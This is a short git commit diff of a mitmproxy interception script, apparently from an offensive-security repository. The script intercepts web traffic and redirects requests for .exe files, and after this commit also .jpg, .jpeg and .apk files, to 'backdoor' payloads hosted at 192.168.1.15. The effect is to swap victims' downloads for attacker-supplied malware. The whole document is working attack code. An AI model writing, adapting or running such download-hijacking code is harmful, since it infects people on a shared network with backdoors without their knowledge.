d0b5f217b1267fa06fc3c980ed1b563727632a03
By Ethical Hacker <59092167+mrhacker51@users.noreply.github.com>
2019-12-20 19:26:48 +0300

    Update mitmproxy.py

--- mitmproxy.py
+++ mitmproxy.py
@@ -3,7 +3,12 @@ import mitmproxy
 def request(flow):
 	if flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".exe"):
 		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/installation.exe"})
-		
+	elif flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".jpg"):
+		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/images.jpg"})
+	elif flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".jpeg"):
+		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/images.jpeg"})
+	elif flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".apk"):
+		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/install.apk"})
 		
 		
 		
